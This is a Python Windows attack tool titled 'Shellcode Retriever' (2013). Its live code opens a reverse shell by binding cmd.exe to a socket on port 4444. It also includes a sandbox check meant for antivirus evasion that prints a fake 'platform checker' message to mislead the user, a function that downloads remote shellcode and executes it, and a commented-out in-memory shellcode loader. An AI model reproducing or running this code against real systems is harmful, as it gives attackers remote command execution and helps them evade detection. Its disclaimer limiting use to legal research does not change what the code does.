#!/usr/bin/env python
'''
    Shellcode Retriever

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''

import socket
import sys
import urllib2
import ctypes
import time
import signal
import struct
from ctypes.wintypes import DWORD, HANDLE, WORD

#Set to True if you want to beacon every X seconds based
#on timesleep
retry = True
#time to sleep in seconds
timesleep = 3600 
opener = urllib2.build_opener()


class socketaddr_in(ctypes.Structure):
    _fields_ = [
        ("sin_family", ctypes.c_short),
        ("sin_port", ctypes.c_ushort),
        ("sin_addr", ctypes.c_ulong),
        ("sin_zero", ctypes.c_char * 8)
    ]

class PROCESS_INFORMAION(ctypes.Structure):
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadID", DWORD)
    ]

class STARTUPINFO(ctypes.Structure):

    _fields_ = [('cb', DWORD),
              ('lpReserved', ctypes.c_void_p),
              ('lpDesktop', ctypes.c_void_p),
              ('lpTitle', ctypes.c_void_p),
              ('dwX', DWORD),
              ('dwY', DWORD),
              ('dwXSize', DWORD),
              ('dwYSize', DWORD),
              ('dwXCountChars', DWORD),
              ('dwYCountChars', DWORD),
              ('dwFillAttribute', DWORD),
              ('dwFlags', DWORD),
              ('wShowWindow', WORD),
              ('cbReserved2', WORD),
              ('lpReserved2', ctypes.c_void_p),
              ('hStdInput', HANDLE),
              ('hStdOutput', HANDLE),
              ('hStdError', HANDLE)
              ]




def pack_ip_addresses(ipaddress):
    hostocts = []
    for i, octet in enumerate(ipaddress.split('.')):
            hostocts.append(int(octet))
    hostip = struct.pack('!BBBB', hostocts[0], hostocts[1],
                              hostocts[2], hostocts[3])
    return hostip

def sandbox_check():
    """
    Quick sandbox check for additional av evasion.
    And a message to throw the user off.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sandbox = True
    try:
        s.connect(('127.0.0.1', 445))
        s.close()
        sandbox = False
    except:
        pass

    if sandbox == True:
        try:
            s.connect(('127.0.0.1', 135))
            s.close()
        except:
            #Message to throw the user off:
            print "Clybase platform checker 2012\nYour platform is:", sys.platform
            sys.exit(0)
        

def allocate_exe():
    """ 
    ctypes VritualAlloc, MoveMem, and CreateThread 
    From http://www.debasish.in/2012_04_01_archive.html
    """
    #WSAData = ctypes.c_int(1000)
    #ptr = ctypes.windll.ws2_32.WSAStartup(0x190, ctypes.pointer(WSAData))
    #print 'ptr', ptr
    #print 'WSAData', WSAData

    addr = socketaddr_in()
    addr.sin_family = socket.AF_INET
    addr.sin_port = socket.htons(4444)
    addr.sin_addr = socket.htonl(0x7f000001)

    liveSocket = ctypes.windll.ws2_32.WSASocketA(ctypes.c_int(socket.AF_INET), 
                                                 ctypes.c_int(socket.SOCK_STREAM), 
                                                 ctypes.c_int(0),
                                                 ctypes.c_void_p(0), 
                                                 ctypes.c_uint(0), 
                                                 DWORD(0), 
                                                 )
    
    newSocket = ctypes.windll.ws2_32.connect(ctypes.c_int(liveSocket), 
                                             ctypes.byref(addr), 
                                             ctypes.sizeof(addr)
                                             )

    sInfo = STARTUPINFO()
    sInfo.cb = ctypes.c_ulong(0)
    sInfo.lpReserved = ctypes.c_void_p(0)
    sInfo.lpDesktop = ctypes.c_void_p(0)
    sInfo.lpTitle = ctypes.c_void_p(0)
    sInfo.dwX = DWORD(0)
    sInfo.dwY = DWORD(0)
    sInfo.dwXSize = DWORD(0)
    sInfo.dwYSize = DWORD(0)
    sInfo.dwXCountChars = DWORD(0)
    sInfo.dwYCountChars = DWORD(0)
    sInfo.dwFillAttribute = DWORD(0)
    sInfo.dwFlags = DWORD(257)
    sInfo.wShowWindow = WORD(0)
    sInfo.cbReserved2 = WORD(0)
    sInfo.lpReserved2 = ctypes.c_void_p(0)
    sInfo.hStdError = newSocket
    sInfo.hStdOutput = newSocket
    sInfo.hStdInput = newSocket

    pinfo = PROCESS_INFORMAION()
    pinfo.hProcess = HANDLE(0)
    pinfo.hThread = HANDLE(0)
    pinfo.dwProcessId = DWORD(0)
    pinfo.dwThreadID = DWORD(0)
    
    
    cmd = ctypes.c_char_p('cmd ')

    ctypes.windll.kernel32.CreateProcessA(ctypes.c_int(0),
                                          ctypes.byref(cmd),
                                          ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.c_int(1),
                                          ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.byref(sInfo),
                                          ctypes.byref(pinfo),
                                          )


    ctypes.windll.kernel32.WaitForSingleObject(ctypes.byref(pinfo), ctypes.c_uint(-1))
    '''
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0)
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
    

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    '''

def get_and_execute(openurl):
    info = opener.open(openurl)
    shellcode = info.read()
    shellcode = bytearray(shellcode)
    allocate_exe(shellcode)


def main():
    #set a url below or leave as '' to manually enter
    allocate_exe()
            

    
if __name__ == "__main__":
        main()
